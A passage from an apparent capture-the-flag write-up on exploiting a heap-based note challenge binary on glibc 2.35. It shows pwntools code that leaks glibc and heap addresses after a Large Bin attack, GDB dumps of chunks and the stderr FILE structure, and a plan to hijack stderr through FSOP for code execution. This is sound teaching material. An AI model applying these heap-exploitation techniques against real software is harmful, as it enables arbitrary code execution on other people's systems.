</code></pre></div><p>Ok, this is very good. But with this attack we do nothing. In addition, we have already used 4 notes, so we will not be able to create anything new, even if we free them (since they are not erased from the array).</p><p>What is usually done with an Large Bin attack is to modify some global variable that gives greater capacities to continue with the exploitation. For example, we could modify <code>global_max_fast</code> so that the chunks that go to the Fast bin can be very large (and not less than <code>0x80</code>). But this does not affect us because we cannot allocate any more chunks&mldr;</p><p>Investigating a little more, we discover techniques such as <a target="_blank" href="https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/">House of Apple</a>, which aim to use a Large Bin attack for corrupting a <code>FILE</code> structure such as <code>stdin</code>, <code>stdout</code> or <code>stderr</code> and obtain arbitrary code execution.</p><p>The techniques related to the <code>FILE</code> structure are called File Stream Oriented Programming (FSOP), and each one is so similar and so different from the others. To find a technique that works, it is necessary to debug and read a lot of Glibc source code.</p><h3 id="leaking-memory-addresses">Leaking memory addresses</h3><p>Whatever the technique we use, we need a couple of memory addresses to continue the exploitation: the GLibc base address and the heap base address.</p><p>Both are easy to get since they appear in fields <code>fd</code> and <code>bk</code> of the freed chunks (see previous output of GDB). Then, we can just use <code>read_note</code> to take the data from the header of the note. We can do it before allocating the last note of the Large Bin attack:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">data</span><span class="mtk1">[</span><span class="mtk1">data</span><span class="mtk1">.</span><span class="mtk8">index</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Name: '</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">6</span><span class="mtk1">:][:</span><span class="mtk6">6</span><span class="mtk1">].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">21b0d0</span>  
<span class="mtk1">    </span><span class="mtk1">heap_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">data</span><span class="mtk1">[</span><span class="mtk1">data</span><span class="mtk1">.</span><span class="mtk8">index</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Date: '</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">6</span><span class="mtk1">:][:</span><span class="mtk6">4</span><span class="mtk1">].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">290</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Heap base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">heap_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
</code></pre></div><p>If we execute it, we will see the addresses we wanted:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './chall'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
[<span class="code-green">+</span>] Starting local process './chall': pid 412242
[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './chall', '412242', '-x', '/tmp/pwn9o9ggnck.gdb']  
[<span class="code-green">+</span>] Waiting for debugger: Done
[<span class="code-green">+</span>] Glibc base address: 0x7fc99ad2d000
[<span class="code-green">+</span>] Heap base address: 0x1d34000
[<span class="code-blue">*</span>] Switching to interactive mode
Note created with index 3

What would you like to do?
[0] Create new note.
[1] Edit existing note.
[2] Read existing note.
[3] Throw note to the bin.
[4] Exit.
&gt;<span class="code-red">$</span>
</code></pre></div><p>And they are correct:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/gx 0x406600
<span class="code-dark-blue">0x406600</span>:       0x0000000001d346e0
<span class="code-green">gef&gt; </span>chunks
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-grey">0x1d34000</span>, size=<span class="code-magenta">0x290</span>, flags=<span class="code-red">PREV_INUSE</span>)
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x1d34290</span>, size=<span class="code-magenta">0x430</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x000001d346e0</span>, bk=<span class="code-dark-green">0x7fc99af480d0</span>, fd_nextsize=<span class="code-dark-blue">0x000001d34290</span>, bk_nextsize=<span class="code-dark-blue">0x000001d346e0</span>)<span class="code-blue">  &lt;-  largebins[idx=63,sz=0x400-0x440][1/2]</span>  
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-grey">0x1d346c0</span>, size=<span class="code-magenta">0x20</span>, flags=)
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x1d346e0</span>, size=<span class="code-magenta">0x420</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7fc99af480d0</span>, bk=<span class="code-dark-blue">0x000001d34290</span>, fd_nextsize=<span class="code-dark-blue">0x000001d34290</span>, bk_nextsize=<span class="code-dark-green">0x0000004065e0</span>)<span class="code-blue">  &lt;-  largebins[idx=63,sz=0x400-0x440][2/2]</span>
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-grey">0x1d34b00</span>, size=<span class="code-magenta">0x20</span>, flags=)
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-grey">0x1d34b20</span>, size=<span class="code-magenta">0x440</span>, flags=<span class="code-red">PREV_INUSE</span>)
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-grey">0x1d34f60</span>, size=<span class="code-magenta">0x440</span>, flags=<span class="code-red">PREV_INUSE</span>)
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x1d353a0</span>, size=<span class="code-magenta">0x1fc60</span>, flags=<span class="code-red">PREV_INUSE</span>) <span class="code-blue"> &lt;-  top</span>
<span class="code-green">gef&gt; </span>libc
<span class="code-dark-cyan">------------------------------------------------------------------------- libc info -------------------------------------------------------------------------</span>
$libc = 0x7fc99ad2d000
path:   /usr/lib/x86_64-linux-gnu/libc.so.6
sha512: b6f66f4643a14c3b7d97ef2ba2cc3a2670ef943f0624ffae6ad57cc2950c16d14156eab45d5827b194223062e5fbdb1d57d98a266723fd9dbdf6d0e657c080e8
sha256: bc1a1b62cb2b8d8c8d73e62848016d5c1caa22208081f07a4f639533efee1e4a
sha1:   2f1387a64ad0eb7906fe82c4efab9b5cfbd55467
md5:    9ee1a1aa1bbd6bf8d7f3a90c0ea5d135
ver:    GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.6) stable release version 2.35.
</code></pre></div><h3 id="fsop">FSOP</h3><p>Something to keep in mind is that the program uses <code>fflush</code> before returning from <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">(){</span>
<span class="mtk1">    </span><span class="mtk8">setbuf</span><span class="mtk1">(</span><span class="mtk8">stdin</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">setbuf</span><span class="mtk1">(</span><span class="mtk8">stdout</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">setbuf</span><span class="mtk1">(</span><span class="mtk8">stderr</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk8">banner</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1">(</span><span class="mtk1">true</span><span class="mtk1">){</span>
<span class="mtk1">        </span><span class="mtk8">show_options</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">op</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_int</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk5">switch</span><span class="mtk1"> (</span><span class="mtk1">op</span><span class="mtk1">){</span>
<span class="mtk1">            </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk8">create_note</span><span class="mtk1">();</span>
<span class="mtk1">                </span><span class="mtk5">continue</span><span class="mtk1">;</span>
<span class="mtk1">            </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk8">edit_note</span><span class="mtk1">();</span>
<span class="mtk1">                </span><span class="mtk5">continue</span><span class="mtk1">;</span>
<span class="mtk1">            </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk8">read_note</span><span class="mtk1">();</span>
<span class="mtk1">                </span><span class="mtk5">continue</span><span class="mtk1">;</span>
<span class="mtk1">            </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk8">throw_note</span><span class="mtk1">();</span>
<span class="mtk1">                </span><span class="mtk5">continue</span><span class="mtk1">;</span>

<span class="mtk1">            </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk5">break</span><span class="mtk1">;</span>

<span class="mtk1">            </span><span class="mtk5">default</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid option! Try again!"</span><span class="mtk1">);</span>  
<span class="mtk1">                </span><span class="mtk5">continue</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Good bye!!"</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk8">fflush</span><span class="mtk1">(</span><span class="mtk8">stderr</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">fflush</span><span class="mtk1">(</span><span class="mtk8">stdout</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">fflush</span><span class="mtk1">(</span><span class="mtk8">stdin</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>These last calls to <code>fflush</code> over <code>stderr</code>, <code>stdout</code> and <code>stdin</code> could give us a clue that the attack vector is FSOP, since it is not necessary to make this type of calls before the end of the program.</p><p>On the other hand, since the binary has no PIE, we know the pointers to these structures in the binary (within the BSS section):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>vmmap chall
[ Legend:  <span class="code-dark-red">Code</span> | <span class="code-dark-blue">Heap</span> | <span class="code-dark-magenta">Stack</span> | <span class="code-dark-green">Writable</span> | ReadOnly</span> | <span class="code-grey">None</span> | <span class="mtku">RWX</span> ]
<span class="code-blue">Start              End                Size               Offset             Perm Path</span>
0x0000000000400000</span> 0x0000000000401000</span> 0x0000000000001000</span> 0x0000000000000000</span> r--</span> ./chall</span>  
<span class="code-dark-red">0x0000000000401000</span> <span class="code-dark-red">0x0000000000403000</span> <span class="code-dark-red">0x0000000000002000</span> <span class="code-dark-red">0x0000000000001000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">./chall</span>
0x0000000000403000</span> 0x0000000000405000</span> 0x0000000000002000</span> 0x0000000000003000</span> r--</span> ./chall</span>
0x0000000000405000</span> 0x0000000000406000</span> 0x0000000000001000</span> 0x0000000000004000</span> r--</span> ./chall</span>
<span class="code-dark-green">0x0000000000406000</span> <span class="code-dark-green">0x0000000000407000</span> <span class="code-dark-green">0x0000000000001000</span> <span class="code-dark-green">0x0000000000005000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">./chall</span>
<span class="code-green">gef&gt; </span>x/30gx 0x0000000000406000
<span class="code-dark-blue">0x406000</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x406010</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x406020</span> &lt;<span class="code-dark-yellow">stdout@GLIBC_2.2.5</span>&gt;:  0x00007fc99af48780      0x0000000000000000
<span class="code-dark-blue">0x406030</span> &lt;<span class="code-dark-yellow">stdin@GLIBC_2.2.5</span>&gt;:   0x00007fc99af47aa0      0x0000000000000000
<span class="code-dark-blue">0x406040</span> &lt;<span class="code-dark-yellow">stderr@GLIBC_2.2.5</span>&gt;:  0x00007fc99af486a0      0x0000000000000000
<span class="code-dark-blue">0x406050</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x406060</span> &lt;<span class="code-dark-yellow">notes</span>&gt;:       0x0000000001d342a0      0x0000000001d346d0
<span class="code-dark-blue">0x406070</span> &lt;<span class="code-dark-yellow">notes</span>+16&gt;:    0x0000000100000001      0x0000000000000000
<span class="code-dark-blue">0x406080</span> &lt;<span class="code-dark-yellow">notes</span>+32&gt;:    0x0000000100000001      0x0000000001d346f0
<span class="code-dark-blue">0x406090</span> &lt;<span class="code-dark-yellow">notes</span>+48&gt;:    0x0000000001d34b10      0x0000000100000001
<span class="code-dark-blue">0x4060a0</span> &lt;<span class="code-dark-yellow">notes</span>+64&gt;:    0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4060b0</span> &lt;<span class="code-dark-yellow">notes</span>+80&gt;:    0x0000000001d34b30      0x0000000000000000
<span class="code-dark-blue">0x4060c0</span> &lt;<span class="code-dark-yellow">notes</span>+96&gt;:    0x0000000100000000      0x0000000000000000
<span class="code-dark-blue">0x4060d0</span> &lt;<span class="code-dark-yellow">notes</span>+112&gt;:   0x0000000200000000      0x0000000001d34f70
<span class="code-dark-blue">0x4060e0</span> &lt;<span class="code-dark-yellow">notes</span>+128&gt;:   0x0000000000000000      0x0000000100000000
</code></pre></div><p>Therefore, a good idea would be to modify the pointer of one of these structures and put an <code>FILE</code> structure in the corresponding heap chunk. This way, when an operation is going to be carried out with this <code>FILE</code> structure, the program will use the structure we have just defined.</p><p>The <code>FILE</code> structure that suits us most is <code>stderr</code>, since it is not used throughout the program except with it calls <code>fflush(htderr)</code>. Therefore, we can be sure that the program will not stop by modifying the pointer to this structure.</p><p>Even so, we have a small problem, and we will not be able to write a complete <code>FILE</code> structure on the heap region we control, since this address points to the <code>prev_size</code> of the guard chunk <code>g1</code>. This is the current structure of <code>stderr</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>p *stderr
$1 = {
  <span class="code-dark-cyan">_flags</span> = 0xfbad2087,
  <span class="code-dark-cyan">_IO_read_ptr</span> = <span class="code-dark-blue">0x7fc99af48723</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+131&gt; "",
  <span class="code-dark-cyan">_IO_read_end</span> = <span class="code-dark-blue">0x7fc99af48723</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+131&gt; "",
  <span class="code-dark-cyan">_IO_read_base</span> = <span class="code-dark-blue">0x7fc99af48723</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+131&gt; "",
  <span class="code-dark-cyan">_IO_write_base</span> = <span class="code-dark-blue">0x7fc99af48723</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+131&gt; "",
  <span class="code-dark-cyan">_IO_write_ptr</span> = <span class="code-dark-blue">0x7fc99af48723</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+131&gt; "",
  <span class="code-dark-cyan">_IO_write_end</span> = <span class="code-dark-blue">0x7fc99af48723</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+131&gt; "",
  <span class="code-dark-cyan">_IO_buf_base</span> = <span class="code-dark-blue">0x7fc99af48723</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+131&gt; "",
  <span class="code-dark-cyan">_IO_buf_end</span> = <span class="code-dark-blue">0x7fc99af48724</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+132&gt; "",
  <span class="code-dark-cyan">_IO_save_base</span> = <span class="code-dark-blue">0x0</span>,
  <span class="code-dark-cyan">_IO_backup_base</span> = <span class="code-dark-blue">0x0</span>,
  <span class="code-dark-cyan">_IO_save_end</span> = <span class="code-dark-blue">0x0</span>,
  <span class="code-dark-cyan">_markers</span> = <span class="code-dark-blue">0x0</span>,
  <span class="code-dark-cyan">_chain</span> = <span class="code-dark-blue">0x7fc99af48780</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>&gt;,
  <span class="code-dark-cyan">_fileno</span> = 0x2,
  <span class="code-dark-cyan">_flags2</span> = 0x0,
  <span class="code-dark-cyan">_old_offset</span> = 0xffffffffffffffff,
  <span class="code-dark-cyan">_cur_column</span> = 0x0,
  <span class="code-dark-cyan">_vtable_offset</span> = 0x0,
  <span class="code-dark-cyan">_shortbuf</span> = "",
  <span class="code-dark-cyan">_lock</span> = <span class="code-dark-blue">0x7fc99af49a60</span> &lt;<span class="code-dark-yellow">_IO_stdfile_2_lock</span>&gt;,
  <span class="code-dark-cyan">_offset</span> = 0xffffffffffffffff,
  <span class="code-dark-cyan">_codecvt</span> = <span class="code-dark-blue">0x0</span>,
  <span class="code-dark-cyan">_wide_data</span> = <span class="code-dark-blue">0x7fc99af478a0</span> &lt;<span class="code-dark-yellow">_IO_wide_data_2</span>&gt;,
  <span class="code-dark-cyan">_freeres_list</span> = <span class="code-dark-blue">0x0</span>,
  <span class="code-dark-cyan">_freeres_buf</span> = <span class="code-dark-blue">0x0</span>,
  <span class="code-dark-cyan">__pad5</span> = 0x0,
  <span class="code-dark-cyan">_mode</span> = 0x0,
  <span class="code-dark-cyan">_unused2</span> = '\000' &lt;repeats 19 times&gt;
}
<span class="code-green">gef&gt; </span>x/30gx stderr
<span class="code-dark-blue">0x7fc99af486a0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>&gt;:       0x00000000fbad2087      0x00007fc99af48723  
<span class="code-dark-blue">0x7fc99af486b0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+16&gt;:    0x00007fc99af48723      0x00007fc99af48723
<span class="code-dark-blue">0x7fc99af486c0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+32&gt;:    0x00007fc99af48723      0x00007fc99af48723
<span class="code-dark-blue">0x7fc99af486d0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+48&gt;:    0x00007fc99af48723      0x00007fc99af48723
<span class="code-dark-blue">0x7fc99af486e0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+64&gt;:    0x00007fc99af48724      0x0000000000000000
<span class="code-dark-blue">0x7fc99af486f0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+80&gt;:    0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fc99af48700</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+96&gt;:    0x0000000000000000      0x00007fc99af48780
<span class="code-dark-blue">0x7fc99af48710</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+112&gt;:   0x0000000000000002      0xffffffffffffffff
<span class="code-dark-blue">0x7fc99af48720</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+128&gt;:   0x0000000000000000      0x00007fc99af49a60
<span class="code-dark-blue">0x7fc99af48730</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+144&gt;:   0xffffffffffffffff      0x0000000000000000
<span class="code-dark-blue">0x7fc99af48740</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+160&gt;:   0x00007fc99af478a0      0x0000000000000000
<span class="code-dark-blue">0x7fc99af48750</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+176&gt;:   0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fc99af48760</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+192&gt;:   0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fc99af48770</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>+208&gt;:   0x0000000000000000      0x00007fc99af44600
<span class="code-dark-blue">0x7fc99af48780</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>&gt;:       0x00000000fbad2887      0x00007fc99af48803
</code></pre></div><p>And this is the memory region in which we have to create a fake structure <code>FILE</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/30gx 0x1d346e0
<span class="code-dark-blue">0x1d346e0</span>:      0x0000000000000041      0x0000000000000421  
<span class="code-dark-blue">0x1d346f0</span>:      0x00007fc99af480d0      0x0000000001d34290
<span class="code-dark-blue">0x1d34700</span>:      0x0000000001d34290      0x00000000004065e0
<span class="code-dark-blue">0x1d34710</span>:      0x4242424242424242      0x4242424242424242
<span class="code-dark-blue">0x1d34720</span>:      0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x1d34730</span>:      0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x1d34740</span>:      0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x1d34750</span>:      0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x1d34760</span>:      0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x1d34770</span>:      0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x1d34780</span>:      0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x1d34790</span>:      0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x1d347a0</span>:      0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x1d347b0</span>:      0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x1d347c0</span>:      0x0000000000000000      0x0000000000000000
</code></pre></div><p>For example, we can modify the first field (the one who has <code>0x0000000000000041</code>) from the footer of the note <code>0</code>. However, the field that contains <code>0x0000000000000421</code> is not modifiable because it is the size of the chunk. Of the following 4 fields we can only touch one, because they are part of the header of note <code>1</code>. The rest of bytes (from<code>0x4242424242424242</code>) are modifiable, because they are part of the text of the note.</p><p>Even so, it is enough to create a <code>FILE</code> structure that allows us to obtain arbitrary code execution.</p><p>To get an exploit that works, I had to research and read many articles related to FSOP in modern environments. These are some of the blog_ that I used as a reference:</p><ul><li><a target="_blank" href="https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc#3---the-fsop-way-targetting-stdout">nobodyisnobody</a></li><li><a target="_blank" href="https://blog.kylebot.net/2022/10/22/angry-FSROP/">blog.kylebot.net</a></li><li><a target="_blank" href="https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">roderickchan.github.io</a></li><li><a target="_blank" href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/fileops.c">elixir.bootlin.com</a></li></ul><p>The first link is a write-up that shows a very simple way to obtain code execution through a <code>FILE</code> structure directly on <code>stdout</code> of Glibc. We can try to write this <code>FILE</code> structure on the heap and point <code>stdout</code> to a chunk we control. However, the exploit does not work.</p><p>Even so, I was able to investigate how it should have worked and I saw that it tried to call <code>_io_wfile_underflow</code>, which comes from a virtual function table (<em>vtable</em>). When the FSOP technique emerged, the <em>vable</em> of the <code>FILE</code> structure almost did not have security, and it was very easy to modify pointers of this table to arbitrary functions to achieve code execution. Today, the <em>vtable</em> is much safer.</p><p>Even so, the previous exploit also targers a <em>vtable</em>, but it is different; it is the <em>vtable</em> called <code>_wide_vtable</code>. And this <em>vtable</em> has no security. All this explanation appears in the second link (which refers to the third, House of Apple 2).</p><p>Following <a target="_blank" href="https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc#3---the-fsop-way-targetting-stdout">nobodyisnobody</a>&rsquo;s example, we can start here. When we execute the exploit, GDB will stop at <code>fflush</code> and we can continue the execution to see what function of the <em>vtable</em> is called:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">io</span><span class="mtk1">, </span><span class="mtk4">'break fflush</span><span class="mtk6">\n</span><span class="mtk4">continue'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk1">MEDIUM</span><span class="mtk1">, </span><span class="mtk1">WITH_FOOTER</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk1">SMALL</span><span class="mtk1">, </span><span class="mtk1">WITH_FOOTER</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'B'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'B'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'B'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'B'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'B'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">throw</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">2</span><span class="mtk1">, </span><span class="mtk1">LARGE</span><span class="mtk1">, </span><span class="mtk1">WITHOUT_FOOTER</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'C'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'C'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'C'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'C'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'C'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">)</span>
